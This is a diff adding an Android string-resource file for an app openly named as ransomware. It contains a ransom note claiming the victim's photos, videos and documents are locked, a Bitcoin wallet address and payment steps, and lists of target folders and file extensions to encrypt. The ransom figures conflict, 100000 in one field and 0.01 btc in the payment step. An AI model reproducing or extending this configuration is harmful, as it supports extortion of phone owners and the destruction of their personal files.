@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+	<string name="app_name">RandyAndy - VIRUS Ransomware</string>
+	<string name="warning">WARNING\nYour data has been encrypted, all your personal videos, photos, documents and files have been LOCKED with encryption.\n\nDO NOT\nUninstall this application, or decryption will be impossible and your files WILL BE LOST forever.</string>
+	
+	
+	<string name="wallet_type">Bitcoin Wallet Address</string>
+	<string name="ransom_amount">100000</string>
+	<string name="wallet_address">15knn9nNy7uzgC3nsaupUYB5n3PYXmtnDy</string>
+	<string name="demo_txid">62f1085c06aa841bcca8c3ade28c64429c83204a56bf072cd3ed76e22c1495be</string>
+	
+	
+	<string name="step1">Immediately send 0.01 btc\nto the following wallet address,</string>
+	<string name="step2">Enter your transaction id "TxID" to decrypt your files</string>
+	
+	<string-array name="directories">
+		<item>Pictures</item>
+		<item>Download</item>
+		<item>DCIM</item>
+		<item>Music</item>
+		<item>Documents</item>
+	</string-array>
+
+	<string-array name="extensions">
+		<item>jpg</item>
+		<item>jpeg</item>
+		<item>JPEG</item>
+		<item>JPG</item>
+		<item>apk</item>
+		<item>pdf</item>
+		<item>PDF</item>
+		<item>xml</item>
+		<item>XML</item>
+		<item>mp4</item>
+		<item>MP4</item>
+		<item>mpeg</item>
+		<item>MPEG</item>
+		<item>wav</item>
+		<item>WAV</item>
+		<item>mp3</item>
+		<item>MP3</item>
+		<item>png</item>
+		<item>PNG</item>
+		<item>zip</item>
+		<item>rar</item>
+		<item>tar</item>
+		<item>ZIP</item>
+		<item>RAR</item>
+		<item>TAR</item>
+		<item>7z</item>
+		<item>csv</item>
+		<item>CSV</item>
+	</string-array>
+	
+</resources>
